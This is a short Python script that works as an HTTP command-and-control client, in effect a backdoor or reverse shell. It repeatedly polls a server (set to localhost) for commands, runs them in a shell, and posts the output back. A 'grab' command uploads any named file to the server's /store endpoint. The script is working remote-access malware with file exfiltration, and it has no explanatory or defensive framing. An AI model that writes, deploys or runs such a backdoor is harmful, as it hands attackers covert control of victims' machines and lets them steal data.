import requests
from subprocess import PIPE, Popen
import os
import time

SERVER_URL = 'http://127.0.0.1'

while True:
    req = requests.get(SERVER_URL)
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split('*')
        if os.path.exists(path):
            url = SERVER_URL + '/store'
            files = {'file':open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url=SERVER_URL, data='[-] Not able to find the file !')
    else:
        CMD = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        post_response = requests.post(url=SERVER_URL, data=CMD.stdout.read())
        post_response = requests.post(url=SERVER_URL, data=CMD.stderr.read())
    time.sleep(3)

